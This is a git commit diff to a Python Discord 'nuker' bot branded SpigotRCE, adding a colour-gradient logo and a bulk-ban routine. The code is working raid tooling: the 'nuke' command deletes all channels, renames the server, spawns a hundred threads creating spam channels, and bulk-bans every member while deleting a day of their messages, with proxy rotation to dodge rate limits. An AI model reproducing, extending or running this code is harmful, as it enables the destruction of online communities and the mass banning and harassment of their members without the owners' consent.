f2fe5a2fcdf3d7c7b280c3871dafeb62cb101915
Milkthedev <128710385+SpigotRCE@users.noreply.github.com>
2024-08-24 20:22:21 +0530

    added bulkban and gradient

--- main.py
+++ main.py
@@ -1,9 +1,21 @@
 from os import system
+from colorama import init
+
+init(autoreset=True)
+
+
+def interpolate_color(color_start, color_end, blend_factor):
+    return (
+        int(color_start[0] + (color_end[0] - color_start[0]) * blend_factor),
+        int(color_start[1] + (color_end[1] - color_start[1]) * blend_factor),
+        int(color_start[2] + (color_end[2] - color_start[2]) * blend_factor)
+    )
 
 
 def print_logo():
     system("cls || clear")
-    print("""
+    logo = """
+    \000
      _____                       _   _       _             
     /  ___|                     | \\ | |     | |            
     \\ `--.  __ _ _ __  _ __ __ _|  \\| |_   _| | _____ _ __ 
@@ -12,7 +24,25 @@ def print_logo():
     \\____/ \\__,_| .__/|_|  \\__,_\\_| \\_/\\__,_|_|\\_\\___|_|   
                 | |                                        
                 |_|                                        
-    """)
+    
+                      SpigotRCE#0
+    \000
+    """
+
+    start_color = (0, 0, 255)
+    middle_color = (128, 0, 128)
+    end_color = (255, 105, 180)
+    logo_lines = logo.strip().split("\n")
+    total_lines = len(logo_lines)
+    half_count = total_lines // 2
+    for i, l in enumerate(logo_lines):
+        if i < half_count:
+            blend_factor = i / half_count
+            r, g, b = interpolate_color(start_color, middle_color, blend_factor)
+        else:
+            blend_factor = (i - half_count) / (total_lines - half_count)
+            r, g, b = interpolate_color(middle_color, end_color, blend_factor)
+        print(f'\033[38;2;{r};{g};{b}m' + l)
 
 
 try:
@@ -65,28 +95,6 @@ def get_all_channels():
                 return r.json()
             else:
                 return
-
-
-def get_all_members():
-    members = []
-    url = f'https://discord.com/api/v10/guilds/{GUILD}/members?limit=1000'
-
-    while True:
-        response = requests.get(url, headers=headers, proxies=get_proxy())
-        if response.status_code == 200:
-            members_data = response.json()
-            members.extend(members_data)
-            if 'next' in response.json():
-                url = response.json()['next']
-            else:
-                break
-        elif response.status_code == 429:
-            time.sleep(int(response.headers.get('Retry-After', 1)))
-        else:
-            print(f"Failed to fetch members. Status code: {response.status_code}")
-            return None
-
-    return members
 
 
 def get_all_roles():
@@ -156,11 +164,23 @@ def remove_channels(channel_ids):
         threading.Thread(target=remove_channel, args=(channel_id,)).start()
 
 
-def remove_members():
+async def remove_members():
     time.sleep(2)
-    while True:
-        for profile in get_all_members():
-            threading.Thread(target=kick_member, args=(profile['user']['id'],)).start()
+    guild = BOT.get_guild(GUILD)
+    if guild:
+        members_to_ban = [member for member in guild.members]
+        try:
+            result = await guild.bulk_ban(
+                members_to_ban,
+                reason=random.choice(MESSAGES),
+                delete_message_seconds=86400
+            )
+            if result.failed:
+                print(f"Failed to ban {len(result.failed)} users.")
+        except discord.Forbidden:
+            print("I do not have permission to ban users.")
+        except discord.HTTPException as e:
+            print(f"An error occurred: {e}")
 
 
 PROXIES = []
@@ -190,14 +210,7 @@ async def on_ready():
         print(guild.name + " (" + str(guild.id) + ") owner: " + guild.owner.name + " (" + str(guild.owner.id) + ") ")
 
 
-@BOT.command()
-async def nuke(ctx):
-    global GUILD
-    GUILD = ctx.guild.id
-    await ctx.message.delete()
-    await ctx.channel.delete()
-    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
-    threading.Thread(target=remove_members).start()
+def nuke_():
     channel_ids = [c['id'] for c in get_all_channels()]
     if len(channel_ids) != 0:
         remove_channels(channel_ids)
@@ -205,6 +218,17 @@ async def nuke(ctx):
         print("No channels found.")
     for _ in range(100):
         threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
+
+
+@BOT.command()
+async def nuke(ctx):
+    global GUILD
+    GUILD = ctx.guild.id
+    await ctx.message.delete()
+    await ctx.channel.delete()
+    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
+    threading.Thread(target=nuke_,).start()
+    await remove_members()
 
 
 @BOT.event
